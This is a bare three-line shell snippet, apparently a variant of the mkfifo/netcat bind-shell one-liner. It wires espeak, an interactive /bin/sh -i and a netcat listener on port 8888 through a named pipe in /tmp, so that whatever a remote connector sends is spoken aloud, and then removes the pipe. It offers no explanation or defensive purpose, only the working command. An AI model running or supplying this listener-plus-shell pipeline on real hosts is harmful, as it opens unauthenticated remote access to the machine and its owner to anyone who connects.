mkfifo /tmp/deleteme
espeak < /tmp/deleteme | /bin/sh -i 2>&1 | nc -lv 8888 > /tmp/deleteme
rm -f /tmp/deleteme
